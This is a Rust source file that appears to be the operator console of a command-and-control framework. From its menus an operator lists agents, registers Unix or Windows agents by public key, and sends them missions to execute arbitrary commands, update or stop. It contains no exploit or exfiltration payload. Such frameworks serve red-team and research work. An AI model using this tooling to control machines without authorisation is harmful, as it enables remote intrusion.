use std::fs;

use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{crypto, model};
use error::ClientResult;
use selection::{Item, Selection};

mod client;
mod error;
mod selection;
mod utils;

const TASKS: &[Item<model::Task, fn() -> model::Task>] = &[
    Item::new("Execute", || {
        model::Task::Execute(utils::prompt("Command").unwrap())
    }),
    Item::new("Update", || model::Task::Update(vec![])),
    Item::new("Stop", || model::Task::Stop),
];

const PLATFORMS: &[Item<model::Platform, fn() -> model::Platform>] = &[
    Item::new("Unix", || model::Platform::Unix),
    Item::new("Windows", || model::Platform::Windows),
];

const COMMANDS: &[Item<ClientResult<()>, fn() -> ClientResult<()>>] = &[
    Item::new("Issue mission", || {
        let agents = client::list_agents()?;

        let Some(agent) = utils::select_agent(&agents)? else {
            println!("No agent selected");
            return Ok(());
        };

        let Some(task) = Selection::from(TASKS).select("Select a task")? else {
            println!("No task selected");
            return Ok(());
        };

        let mission = client::issue_mission(agent.id, task)?;
        loop {
            match client::get_mission_result(mission.id) {
                Ok(Some(result)) => {
                    println!("{result}");
                    break Ok(());
                }
                Err(e) => eprintln!("{e}"),
                _ => {}
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
    }),
    Item::new("List agents", || {
        for agent in client::list_agents()? {
            println!("\t{}", utils::agent_fmt(&agent));
        }
        Ok(())
    }),
    Item::new("Create agent", || {
        let Some(platform) = Selection::from(PLATFORMS).select("Select platform")? else {
            println!("No platform selected");
            return Ok(());
        };

        let response = ureq::post("http://localhost:3000/agents").send_json(model::Agent {
            id: Default::default(),
            name: utils::prompt("Agent name")?,
            identity: crypto::VerifyingKey::from_bytes(
                fs::read(utils::prompt("Agent identity public key file path")?)?
                    .as_slice()
                    .try_into()
                    .unwrap(),
            )
            .unwrap()
            .to_bytes(),
            platform,
            created_at: Default::default(),
            last_seen_at: Default::default(),
        })?;

        if response.status() == 201 {
            println!("Agent created");
        } else {
            eprintln!("Failed to create agent");
        }
        Ok(())
    }),
    Item::new("Update agent name", || {
        let agents = client::list_agents()?;

        let Some(agent) = utils::select_agent(&agents)? else {
            println!("No agent selected");
            return Ok(());
        };

        let name = utils::prompt("New name")?;

        let response = ureq::put(&format!("http://localhost:3000/agents/{}", agent.id)).send_json(
            model::Agent {
                name,
                ..agent.clone()
            },
        )?;

        if response.status() == 200 {
            println!("Agent name updated");
        } else {
            eprintln!("Failed to update agent name");
        }
        Ok(())
    }),
    Item::new("Generate identity key pair", || {
        let signing_key = crypto::get_signing_key();
        println!(
            "[+] Signing key: {:?}",
            BASE64_STANDARD.encode(signing_key.as_bytes())
        );
        println!(
            "[+] Verifying key: {:?}",
            BASE64_STANDARD.encode(signing_key.verifying_key().as_bytes())
        );
        Ok(())
    }),
];

// TODO Make a menu system
// 1. Select context of an agent
// 2. CRUD + issue mission
fn main() -> ClientResult<()> {
    let selection = Selection::from(COMMANDS);
    while let Some(result) = selection.select("Select a subcommand")? {
        if let Err(e) = result {
            eprintln!("{e}");
        }
    }
    println!("Bye! :)");
    Ok(())
}
